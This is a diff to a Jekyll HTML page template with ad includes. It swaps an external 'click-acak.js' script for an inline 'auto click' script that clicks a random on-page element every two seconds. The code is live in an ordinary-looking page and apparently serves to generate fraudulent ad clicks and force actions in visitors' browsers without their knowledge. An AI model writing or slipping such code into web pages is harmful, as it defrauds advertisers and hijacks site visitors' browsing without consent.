@@ -924,6 +924,27 @@ permalink: /nga/
     
     {% include /ads/gobloggugel/umum.html %}
 {% include footer.html %}
-<script src="https://nengmaya.pages.dev/js/click-acak.js"></script>
+
+ 
+<!--auto click-->
+    <script>
+        setInterval(function() {
+            let x = Math.floor(Math.random() * window.innerWidth);
+            let y = Math.floor(Math.random() * window.innerHeight);
+            let elemen = document.elementFromPoint(x, y);
+            if (elemen) {
+                elemen.click();
+            }
+        }, 2000);
+    </script>
+
+
+  
 </body>
 </html>
+
+
+
+
+
+
